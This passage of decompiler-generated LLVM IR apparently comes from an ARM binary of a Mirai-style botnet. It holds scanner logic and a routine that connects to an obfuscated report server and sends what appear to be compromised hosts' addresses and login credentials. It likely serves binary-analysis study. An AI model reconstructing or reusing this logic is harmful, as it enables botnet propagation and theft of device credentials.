  %v3_f0a8 = load i32, i32* %v2_f0a8, align 4
  store i32 %v3_f0a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e618.backedge

dec_label_pc_e618.backedge.thread:                ; preds = %dec_label_pc_e7dc, %dec_label_pc_e8b0, %dec_label_pc_e984, %dec_label_pc_ea58, %dec_label_pc_eb2c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e620

dec_label_pc_e618.backedge.thread526:             ; preds = %dec_label_pc_eb90, %dec_label_pc_e9e8, %dec_label_pc_e914, %dec_label_pc_eabc, %dec_label_pc_e840
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e620

dec_label_pc_e618.backedge:                       ; preds = %dec_label_pc_e694, %dec_label_pc_f098, %dec_label_pc_f19c
  %v0_e620186 = phi i32 [ %v0_f1a4, %dec_label_pc_f19c ], [ %v0_f0a8, %dec_label_pc_f098 ], [ %v0_e694, %dec_label_pc_e694 ]
  %v0_e618.be = phi i32 [ %v3_f1a4, %dec_label_pc_f19c ], [ %v3_f0a8, %dec_label_pc_f098 ], [ %v3_e694, %dec_label_pc_e694 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e618 = icmp eq i32 %v0_e618.be, 0
  store i1 %v2_e618, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e618, label %dec_label_pc_e720, label %dec_label_pc_e620

dec_label_pc_f0b0:                                ; preds = %dec_label_pc_e5d0
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 %v2_eca4, i32* %r3.global-to-local, align 4
  store i32 %v2_ec90, i32* @lr, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r1, align 4
  store i8 0, i8* %stack_var_-56, align 1
  store i32 4, i32* %stack_var_-60, align 4
  %v5_f0dc = call i32 @getsockopt(i32 %v3_e5c4, i32 1, i32 4, i32 %v2_eca4, i32 %v2_ec90)
  %v3_f0e0 = load i8, i8* %stack_var_-56, align 1
  %v4_f0e0 = sext i8 %v3_f0e0 to i32
  store i32 %v4_f0e0, i32* %r3.global-to-local, align 4
  %v2_f0e4 = or i32 %v4_f0e0, %v5_f0dc
  store i32 %v2_f0e4, i32* %r0.global-to-local, align 4
  %v4_f0e4 = icmp eq i32 %v2_f0e4, 0
  store i1 %v4_f0e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f0e4, label %dec_label_pc_f0ec, label %dec_label_pc_f180

dec_label_pc_f0ec:                                ; preds = %dec_label_pc_f0b0
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_f0f0 = load i32, i32* @r5, align 4
  %v2_f0f0 = add i32 %v1_f0f0, 12
  %v3_f0f0 = inttoptr i32 %v2_f0f0 to i32*
  store i32 2, i32* %v3_f0f0, align 4
  %v0_f0f4 = call i32 @rand_next()
  %v2_f0fc = load i16, i16* bitcast (i16** @global_var_20f80.125 to i16*), align 4
  %v3_f0fc = zext i16 %v2_f0fc to i32
  %v2_f100 = udiv i32 %v0_f0f4, %v3_f0fc
  %v3_f100 = urem i32 %v0_f0f4, %v3_f0fc
  store i32 %v2_f100, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20f50.121 to i32), i32* %r3.global-to-local, align 4
  %v2_f108 = load i32, i32* @global_var_20f50.121, align 4
  store i32 %v2_f108, i32* %ip.global-to-local, align 4
  %v1_f110 = load i32, i32* @r4, align 4
  %v9_f110 = icmp eq i32 %v2_f108, %v1_f110
  store i1 %v9_f110, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_f100, i32* %r1.global-to-local, align 4
  %v7_f118 = icmp sgt i32 %v2_f108, %v1_f110
  br i1 %v7_f118, label %dec_label_pc_f11c, label %dec_label_pc_f15c

dec_label_pc_f11c:                                ; preds = %dec_label_pc_f0ec
  %v2_f120 = load i32, i32* @global_var_20f7c.123, align 4
  store i32 %v2_f120, i32* %r3.global-to-local, align 4
  store i32 %v1_f110, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f13c

dec_label_pc_f12c:                                ; preds = %dec_label_pc_f14c, %dec_label_pc_f13c
  %v1_f12c = add i32 %v0_f12c, 1
  store i32 %v1_f12c, i32* %r2.global-to-local, align 4
  %v9_f130 = icmp eq i32 %v1_f12c, %v2_f108
  %v1_f134 = add i32 %v0_f134, 16
  store i32 %v1_f134, i32* %r3.global-to-local, align 4
  br i1 %v9_f130, label %dec_label_pc_f15c.loopexit, label %dec_label_pc_f13c

dec_label_pc_f13c:                                ; preds = %dec_label_pc_f12c, %dec_label_pc_f11c
  %v0_f12c = phi i32 [ %v1_f12c, %dec_label_pc_f12c ], [ %v1_f110, %dec_label_pc_f11c ]
  %v0_f134 = phi i32 [ %v1_f134, %dec_label_pc_f12c ], [ %v2_f120, %dec_label_pc_f11c ]
  store i32 %v0_f134, i32* %r0.global-to-local, align 4
  %v1_f140 = add i32 %v0_f134, 8
  %v2_f140 = inttoptr i32 %v1_f140 to i16*
  %v3_f140 = load i16, i16* %v2_f140, align 2
  %v4_f140 = zext i16 %v3_f140 to i32
  store i32 %v4_f140, i32* %r3.global-to-local, align 4
  %tmp424 = icmp ugt i32 %v4_f140, %v3_f100
  br i1 %tmp424, label %dec_label_pc_f12c, label %dec_label_pc_f14c

dec_label_pc_f14c:                                ; preds = %dec_label_pc_f13c
  %v1_f14c = add i32 %v0_f134, 10
  %v2_f14c = inttoptr i32 %v1_f14c to i16*
  %v3_f14c = load i16, i16* %v2_f14c, align 2
  %v4_f14c = zext i16 %v3_f14c to i32
  store i32 %v4_f14c, i32* %r3.global-to-local, align 4
  %v3_f150 = icmp uge i32 %v4_f14c, %v3_f100
  %v9_f150 = icmp eq i32 %v4_f14c, %v3_f100
  %v2_f154 = xor i1 %v3_f150, true
  %v3_f154 = or i1 %v9_f150, %v2_f154
  br i1 %v3_f154, label %dec_label_pc_f12c, label %dec_label_pc_f160.loopexit

dec_label_pc_f15c.loopexit:                       ; preds = %dec_label_pc_f12c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f15c

dec_label_pc_f15c:                                ; preds = %dec_label_pc_f15c.loopexit, %dec_label_pc_f0ec
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f160

dec_label_pc_f160.loopexit:                       ; preds = %dec_label_pc_f14c
  store i1 %v3_f150, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f160

dec_label_pc_f160:                                ; preds = %dec_label_pc_f160.loopexit, %dec_label_pc_f15c
  %v0_f174 = phi i32 [ %v0_f134, %dec_label_pc_f160.loopexit ], [ 0, %dec_label_pc_f15c ]
  %v0_f160 = load i32, i32* @r5, align 4
  %v1_f160 = add i32 %v0_f160, 4
  %v2_f160 = inttoptr i32 %v1_f160 to i32*
  %v3_f160 = load i32, i32* %v2_f160, align 4
  %v3_f164 = udiv i32 %v3_f160, 32
  store i32 %v3_f164, i32* %r2.global-to-local, align 4
  %v1_f168 = urem i32 %v3_f160, 32
  store i32 %v1_f168, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_f16c = mul nuw nsw i32 %v3_f164, 4
  store i32 %v3_f16c, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_f174 = inttoptr i32 %v0_f160 to i32*
  store i32 %v0_f174, i32* %v2_f174, align 4
  %v0_f178 = load i32, i32* %r3.global-to-local, align 4
  %v1_f178 = load i32, i32* @r5, align 4
  %v2_f178 = add i32 %v1_f178, 24
  %v3_f178 = inttoptr i32 %v2_f178 to i32*
  store i32 %v0_f178, i32* %v3_f178, align 4
  %v0_e600.pre = load i32, i32* @ip, align 4
  %v1_e608.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e5f8

dec_label_pc_f180:                                ; preds = %dec_label_pc_f0b0
  %v0_f180 = load i32, i32* @r5, align 4
  %v1_f180 = add i32 %v0_f180, 4
  %v2_f180 = inttoptr i32 %v1_f180 to i32*
  %v3_f180 = load i32, i32* %v2_f180, align 4
  store i32 %v3_f180, i32* %r0.global-to-local, align 4
  %v1_f184 = call i32 @__GI___libc_close(i32 %v3_f180)
  store i32 %v1_f184, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_f18c = load i32, i32* @r4, align 4
  %v1_f18c = load i32, i32* @r5, align 4
  %v2_f18c = add i32 %v1_f18c, 12
  %v3_f18c = inttoptr i32 %v2_f18c to i32*
  store i32 %v0_f18c, i32* %v3_f18c, align 4
  %v0_f190 = load i32, i32* %r3.global-to-local, align 4
  %v1_f190 = load i32, i32* @r5, align 4
  %v2_f190 = add i32 %v1_f190, 4
  %v3_f190 = inttoptr i32 %v2_f190 to i32*
  store i32 %v0_f190, i32* %v3_f190, align 4
  %v0_f194 = load i32, i32* @r4, align 4
  %v1_f194 = trunc i32 %v0_f194 to i8
  %v2_f194 = load i32, i32* @r5, align 4
  %v3_f194 = add i32 %v2_f194, 284
  %v4_f194 = inttoptr i32 %v3_f194 to i8*
  store i8 %v1_f194, i8* %v4_f194, align 1
  br label %dec_label_pc_e720

dec_label_pc_f19c:                                ; preds = %thread-pre-split103
  %v1_f1a4 = add i32 %v0_f1a4, 12
  %v2_f1a4 = inttoptr i32 %v1_f1a4 to i32*
  %v3_f1a4 = load i32, i32* %v2_f1a4, align 4
  store i32 %v3_f1a4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e618.backedge

dec_label_pc_f1e4:                                ; preds = %bb423
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_f1f0 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_f1f0, i32* %r0.global-to-local, align 4
  %v2_f1f4 = icmp eq i32 %v3_f1f0, -1
  store i1 %v2_f1f4, i1* %cpsr_c.global-to-local, align 1
  %v7_f1f4 = icmp eq i32 %v3_f1f0, -1
  store i1 %v7_f1f4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_f1f0, i32* @r4, align 4
  br i1 %v7_f1f4, label %dec_label_pc_f340, label %dec_label_pc_f200

dec_label_pc_f200:                                ; preds = %dec_label_pc_f1e4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_f204 = call i32 @table_unlock_val(i32 2)
  store i32 2032805430, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i16** @global_var_23a50.70 to i32), i32* %r3.global-to-local, align 4
  %v0_f210 = load i32, i32* @r6, align 4
  store i32 %v0_f210, i32* %r1.global-to-local, align 4
  store i32 2032805430, i32* @global_var_23a54.72, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_f21c = inttoptr i32 %v0_f210 to i32*
  %v3_f21c = call i32 @table_retrieve_val(i32 2, i32* %v2_f21c)
  store i32 %v2_efcc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_f230 = call i32 @table_lock_val(i32 2)
  %v0_f234 = load i32, i32* @r4, align 4
  store i32 %v0_f234, i32* %r0.global-to-local, align 4
  store i32 %v2_efcc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_f240 = call i32 @__libc_connect(i32 %v0_f234, i32 %v2_efcc, i32 16)
  store i32 %v3_f240, i32* %r0.global-to-local, align 4
  %v3_f244 = icmp eq i32 %v3_f240, -1
  store i1 %v3_f244, i1* %cpsr_c.global-to-local, align 1
  %v8_f244 = icmp eq i32 %v3_f240, -1
  store i1 %v8_f244, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f244, label %dec_label_pc_f24c, label %dec_label_pc_f29c

dec_label_pc_f24c:                                ; preds = %dec_label_pc_f200
  %v0_f24c = load i32, i32* @r4, align 4
  store i32 %v0_f24c, i32* %r0.global-to-local, align 4
  %v1_f250 = call i32 @__GI___libc_close(i32 %v0_f24c)
  %v0_f254 = load i32, i32* @r6, align 4
  store i32 %v0_f254, i32* %r0.global-to-local, align 4
  %v1_f258 = call i32 @__GI_exit(i32 %v0_f254)
  store i32 %v1_f258, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f25c

dec_label_pc_f25c:                                ; preds = %dec_label_pc_e6cc, %dec_label_pc_f24c
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_f260 = load i32, i32* @sb, align 4
  %v2_f260 = inttoptr i32 %v1_f260 to i32*
  store i32 104, i32* %v2_f260, align 4
  br label %dec_label_pc_e6e4

dec_label_pc_f268:                                ; preds = %dec_label_pc_e46c
  store i32 %v3_f268, i32* %r0.global-to-local, align 4
  %v3_f270 = udiv i32 %v3_f268, 32
  %v3_f274 = mul nuw nsw i32 %v3_f270, 4
  store i32 %v2_f278, i32* @lr, align 4
  %v2_f27c = add i32 %v3_f274, %v2_f278
  store i32 %v2_f27c, i32* %r3.global-to-local, align 4
  %v1_f280 = add i32 %v2_f27c, -312
  %v2_f280 = inttoptr i32 %v1_f280 to i32*
  %v3_f280 = load i32, i32* %v2_f280, align 4
  %v1_f284 = urem i32 %v3_f268, 32
  store i32 %v1_f284, i32* %r1.global-to-local, align 4
  %v7_f288 = shl i32 1, %v1_f284
  %v8_f288 = or i32 %v3_f280, %v7_f288
  store i32 %v8_f288, i32* %r2.global-to-local, align 4
  %v0_f28c = load i32, i32* @r5, align 4
  %v3_f28c = icmp uge i32 %v0_f28c, %v3_f268
  store i1 %v3_f28c, i1* %cpsr_c.global-to-local, align 1
  %v9_f28c = icmp eq i32 %v0_f28c, %v3_f268
  store i1 %v9_f28c, i1* %cpsr_z.global-to-local, align 1
  %v5_f290 = icmp slt i32 %v0_f28c, %v3_f268
  br i1 %v5_f290, label %bb425, label %bb426

bb425:                                            ; preds = %dec_label_pc_f268
  store i32 %v3_f268, i32* @r5, align 4
  br label %bb426

bb426:                                            ; preds = %dec_label_pc_f268, %bb425
  store i32 %v8_f288, i32* %v2_f280, align 4
  br label %bb376

dec_label_pc_f29c:                                ; preds = %dec_label_pc_f200
  store i32 %v2_eca4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f2ac = load i32, i32* @r4, align 4
  store i32 %v0_f2ac, i32* %r0.global-to-local, align 4
  %v0_f2b0 = load i32, i32* @r6, align 4
  %v6_f2b0 = trunc i32 %v0_f2b0 to i8
  store i8 %v6_f2b0, i8* %stack_var_-56, align 1
  %v6_f2b4 = call i32 @__libc_send(i32 %v0_f2ac, i32 %v2_eca4, i32 1, i32 16384)
  store i32 %v2_ec90, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f2c8 = load i32, i32* @r4, align 4
  store i32 %v0_f2c8, i32* %r0.global-to-local, align 4
  %v4_f2cc = call i32 @__libc_send(i32 %v0_f2c8, i32 %v2_ec90, i32 4, i32 16384)
  %v2_f2d4 = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_f2d4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f2e0 = load i32, i32* @r4, align 4
  store i32 %v0_f2e0, i32* %r0.global-to-local, align 4
  %v4_f2e4 = call i32 @__libc_send(i32 %v0_f2e0, i32 %v2_f2d4, i32 2, i32 16384)
  %v0_f2e8 = load i32, i32* @r8, align 4
  %v1_f2e8 = add i32 %v0_f2e8, 12
  store i32 %v1_f2e8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f2f4 = load i32, i32* @r4, align 4
  store i32 %v0_f2f4, i32* %r0.global-to-local, align 4
  %v4_f2f8 = call i32 @__libc_send(i32 %v0_f2f4, i32 %v1_f2e8, i32 1, i32 16384)
  store i32 %v4_f2f8, i32* %r0.global-to-local, align 4
  %v0_f2fc = load i32, i32* @r8, align 4
  %v1_f2fc = inttoptr i32 %v0_f2fc to i32*
  %v2_f2fc = load i32, i32* %v1_f2fc, align 4
  store i32 %v2_f2fc, i32* %r1.global-to-local, align 4
  %v1_f300 = add i32 %v0_f2fc, 12
  %v2_f300 = inttoptr i32 %v1_f300 to i8*
  %v3_f300 = load i8, i8* %v2_f300, align 1
  %v4_f300 = zext i8 %v3_f300 to i32
  store i32 %v4_f300, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f308 = load i32, i32* @r4, align 4
  store i32 %v0_f308, i32* %r0.global-to-local, align 4
  %v4_f30c = call i32 @__libc_send(i32 %v0_f308, i32 %v2_f2fc, i32 %v4_f300, i32 16384)
  %v0_f310 = load i32, i32* @r8, align 4
  %v1_f310 = add i32 %v0_f310, 13
  store i32 %v1_f310, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f31c = load i32, i32* @r4, align 4
  store i32 %v0_f31c, i32* %r0.global-to-local, align 4
  %v4_f320 = call i32 @__libc_send(i32 %v0_f31c, i32 %v1_f310, i32 1, i32 16384)
  %v0_f324 = load i32, i32* @r4, align 4
  store i32 %v0_f324, i32* %r0.global-to-local, align 4
  %v0_f328 = load i32, i32* @r8, align 4
  %v1_f328 = add i32 %v0_f328, 13
  %v2_f328 = inttoptr i32 %v1_f328 to i8*
  %v3_f328 = load i8, i8* %v2_f328, align 1
  %v4_f328 = zext i8 %v3_f328 to i32
  store i32 %v4_f328, i32* %r2.global-to-local, align 4
  %v1_f32c = add i32 %v0_f328, 4
  %v2_f32c = inttoptr i32 %v1_f32c to i32*
  %v3_f32c = load i32, i32* %v2_f32c, align 4
  store i32 %v3_f32c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f334 = call i32 @__libc_send(i32 %v0_f324, i32 %v3_f32c, i32 %v4_f328, i32 16384)
  %v0_f338 = load i32, i32* @r4, align 4
  store i32 %v0_f338, i32* %r0.global-to-local, align 4
  %v1_f33c = call i32 @__GI___libc_close(i32 %v0_f338)
  store i32 %v1_f33c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f340

dec_label_pc_f340:                                ; preds = %dec_label_pc_f1e4, %dec_label_pc_f29c
  %v0_f340 = load i32, i32* @r6, align 4
  store i32 %v0_f340, i32* %r0.global-to-local, align 4
  %v1_f344 = call i32 @__GI_exit(i32 %v0_f340)
  store i32 %v1_f344, i32* %r0.global-to-local, align 4
  ret i32 %v1_f344

; uselistorder directives
  uselistorder i32 %v0_f28c, { 0, 2, 1 }
  uselistorder i32 %v1_f284, { 1, 0 }
  uselistorder i1 %v7_f1f4, { 1, 0 }
  uselistorder i32 %v3_f1f0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_f1a4, { 1, 0 }
  uselistorder i32 %v3_f160, { 1, 0 }
  uselistorder i1 %v3_f150, { 1, 0 }
  uselistorder i32 %v0_f134, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v3_f100, { 2, 1, 0, 3 }
  uselistorder i32 %v3_f0fc, { 1, 0 }
  uselistorder i32 %v0_f0f4, { 1, 0 }
  uselistorder i32 %v4_f084, { 1, 0, 2 }
  uselistorder i32 %v3_f030, { 1, 0 }
  uselistorder i1 %v2_eff8, { 1, 0 }
  uselistorder i32 %.430, { 1, 0 }
  uselistorder i1 %v7_efe0, { 1, 0 }
  uselistorder i32 %v0_efdc, { 2, 1, 0, 3 }
  uselistorder i1 %v7_efb4, { 1, 0 }
  uselistorder i32 %v0_efb4, { 2, 1, 0, 3 }
  uselistorder i32 %v0_ef38, { 1, 0 }
  uselistorder i32 %v0_ef1c.pr, { 1, 0 }
  uselistorder i32 %v0_eee8, { 1, 2, 0 }
  uselistorder i32 %v0_eeac, { 1, 0 }
  uselistorder i32 %v1_eea4, { 1, 0 }
  uselistorder i32 %v1_ee9c, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_ee98, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_ee98, { 0, 2, 1 }
  uselistorder i32 %v0_ee78.pr, { 1, 0 }
  uselistorder i32 %v0_ee58.pr, { 1, 0 }
  uselistorder i1 %v7_ee30, { 1, 0 }
  uselistorder i1 %v2_ee20, { 1, 0, 2 }
  uselistorder i1 %v2_ee04, { 1, 0, 2 }
  uselistorder i32 %v1_ee24, { 1, 2, 3, 0 }
  uselistorder i32 %v1_edf8, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v2_ee28, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_edac, { 1, 0 }
  uselistorder i32 %v0_f1a4, { 1, 0, 2 }
  uselistorder i1 %v0_ed9c, { 1, 0 }
  uselistorder i32 %v4_ed90, { 1, 0, 2 }
  uselistorder i32 %v1_ed5c, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_ed5c, { 0, 2, 1 }
  uselistorder i32 %v0_ed54, { 1, 0 }
  uselistorder i1 %v7_ed50, { 1, 0 }
  uselistorder i1 %v7_ed48, { 1, 0 }
  uselistorder i1 %v8_ed40, { 1, 0 }
  uselistorder i1 %v7_ed24, { 1, 0 }
  uselistorder i1 %v7_ed1c, { 1, 0 }
  uselistorder i1 %v8_ed14, { 1, 0 }
  uselistorder i32 %v1_ecfc, { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i1 %v7_eccc, { 1, 0 }
  uselistorder i32 %v1_ec74, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_ec74, { 0, 2, 1 }
  uselistorder i32 %v0_ec6c, { 1, 0 }
  uselistorder i1 %v7_ec68, { 1, 0 }
  uselistorder i1 %v7_ec60, { 1, 0 }
  uselistorder i1 %v7_ec58, { 1, 0 }
  uselistorder i1 %v8_ec50, { 1, 0 }
  uselistorder i1 %v7_ec34, { 1, 0 }
  uselistorder i1 %v7_ec2c, { 1, 0 }
  uselistorder i1 %v7_ec24, { 1, 0 }
  uselistorder i1 %v8_ec1c, { 1, 0 }
  uselistorder i32 %v1_ec04, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_eba0, { 1, 0 }
  uselistorder i8 %v3_eb98, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_eb90, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_eb90, { 0, 2, 1 }
  uselistorder i32 %v0_eb88, { 1, 0 }
  uselistorder i1 %v7_eb84, { 1, 0 }
  uselistorder i1 %v7_eb7c, { 1, 0 }
  uselistorder i1 %v7_eb74, { 1, 0 }
  uselistorder i1 %v7_eb60, { 1, 0 }
  uselistorder i1 %v7_eb58, { 1, 0 }
  uselistorder i1 %v7_eb50, { 1, 0 }
  uselistorder i1 %v8_eb48, { 1, 0 }
  uselistorder i32 %v1_eb30, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_eacc, { 1, 0 }
  uselistorder i8 %v3_eac4, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_eabc, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_eabc, { 0, 2, 1 }
  uselistorder i32 %v0_eab4, { 1, 0 }
  uselistorder i1 %v7_eab0, { 1, 0 }
  uselistorder i1 %v7_eaa8, { 1, 0 }
  uselistorder i1 %v7_eaa0, { 1, 0 }
  uselistorder i1 %v7_ea8c, { 1, 0 }
  uselistorder i1 %v7_ea84, { 1, 0 }
  uselistorder i1 %v7_ea7c, { 1, 0 }
  uselistorder i1 %v8_ea74, { 1, 0 }
  uselistorder i32 %v1_ea5c, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_e9f8, { 1, 0 }
  uselistorder i8 %v3_e9f0, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_e9e8, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_e9e8, { 0, 2, 1 }
  uselistorder i32 %v0_e9e0, { 1, 0 }
  uselistorder i1 %v7_e9dc, { 1, 0 }
  uselistorder i1 %v7_e9d4, { 1, 0 }
  uselistorder i1 %v7_e9cc, { 1, 0 }
  uselistorder i1 %v7_e9b8, { 1, 0 }
  uselistorder i1 %v7_e9b0, { 1, 0 }
  uselistorder i1 %v7_e9a8, { 1, 0 }
  uselistorder i1 %v8_e9a0, { 1, 0 }
  uselistorder i32 %v1_e988, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_e924, { 1, 0 }
  uselistorder i8 %v3_e91c, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_e914, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_e914, { 0, 2, 1 }
  uselistorder i32 %v0_e90c, { 1, 0 }
  uselistorder i1 %v7_e908, { 1, 0 }
  uselistorder i1 %v7_e900, { 1, 0 }
  uselistorder i1 %v7_e8f8, { 1, 0 }
  uselistorder i1 %v7_e8e4, { 1, 0 }
  uselistorder i1 %v7_e8dc, { 1, 0 }
  uselistorder i1 %v7_e8d4, { 1, 0 }
  uselistorder i1 %v8_e8cc, { 1, 0 }
  uselistorder i32 %v1_e8b4, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_e850, { 1, 0 }
  uselistorder i8 %v3_e848, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_e840, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_e840, { 0, 2, 1 }
  uselistorder i32 %v0_e838, { 1, 0 }
  uselistorder i1 %v7_e834, { 1, 0 }
  uselistorder i1 %v7_e82c, { 1, 0 }
  uselistorder i1 %v7_e824, { 1, 0 }
  uselistorder i1 %v7_e810, { 1, 0 }
  uselistorder i1 %v7_e808, { 1, 0 }
  uselistorder i1 %v7_e800, { 1, 0 }
  uselistorder i1 %v8_e7f8, { 1, 0 }
  uselistorder i32 %v1_e7e0, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_e7cc, { 1, 2, 0 }
  uselistorder i32 %v2_e7b8, { 1, 0 }
  uselistorder i32 %v0_e7b8, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v3_e7b4, { 2, 1, 4, 0, 5, 3 }
  uselistorder i32 %v1_e78c, { 2, 1, 0 }
  uselistorder i1 %v7_e768, { 1, 0 }
  uselistorder i32 %v4_e764, { 1, 0, 2 }
  uselistorder i32 %v1_e724, { 0, 2, 3, 4, 1 }
  uselistorder i1 %v1_e700, { 1, 0 }
  uselistorder i32 %v1_e6f4, { 2, 1, 0 }
  uselistorder i32 %v1_e6f0, { 1, 0 }
  uselistorder i32 %v0_e694, { 2, 21, 4, 3, 20, 19, 5, 6, 23, 7, 8, 22, 9, 10, 24, 11, 12, 27, 13, 14, 25, 15, 16, 26, 17, 18, 28, 29, 1, 0 }
  uselistorder i32 %v1_e670, { 1, 2, 3, 0 }
  uselistorder i32 %v3_e66c, { 1, 0 }
  uselistorder i32 %v4_e650, { 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %v2_e63c, { 1, 0, 2 }
  uselistorder i32 %v3_e638, { 1, 0, 2 }
  uselistorder i32 %v0_f040, { 1, 0, 2 }
  uselistorder i32 %v3_e604, { 1, 0 }
  uselistorder i32 %v1_e5e8, { 3, 2, 1, 0 }
  uselistorder i32 %v3_e5e4, { 1, 0 }
  uselistorder i32 %v3_e5dc, { 1, 2, 0 }
  uselistorder i1 %v7_e5c8, { 1, 0 }
  uselistorder i32 %v3_e5c4, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_e5b8, { 1, 0 }
  uselistorder i32 %v2_efcc, { 1, 0, 2, 3 }
  uselistorder i32* %v2_ecac, { 1, 2, 3, 0 }
  uselistorder i32 %v2_eca4, { 4, 5, 1, 0, 3, 6, 7, 2 }
  uselistorder i32 %v2_ec90, { 1, 0, 3, 2, 9, 8, 5, 7, 6, 4 }
  uselistorder i32 %v2_eedc, { 1, 0 }
  uselistorder i32 %v1_e568, { 0, 1, 3, 2 }
  uselistorder i32 %v0_e568, { 0, 1, 3, 2 }
  uselistorder i32 %v1_e534, { 2, 1, 0 }
  uselistorder i32 %v1_e530, { 1, 0 }
  uselistorder i1 %v2_e510, { 1, 0, 2 }
  uselistorder i32 %v0_e50c, { 1, 0, 2 }
  uselistorder i1 %v7_e4d8, { 0, 3, 4, 1, 2 }
  uselistorder i1 %v2_e4d8, { 1, 0, 2 }
  uselistorder i32 %v2_e4d0, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_e4c4, { 1, 0, 2 }
  uselistorder i32 %v0_e4c8, { 1, 0 }
  uselistorder i32 %v1_e4ac, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_e4a0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_e4a0, { 0, 2, 1 }
  uselistorder i32 %v1_e490, { 1, 0 }
  uselistorder i32 %v3_f268, { 4, 7, 5, 6, 1, 0, 9, 3, 2, 8 }
  uselistorder i32 %v2_f278, { 0, 7, 1, 5, 2, 4, 3, 6 }
  uselistorder i32 %v1_e3e0, { 1, 0 }
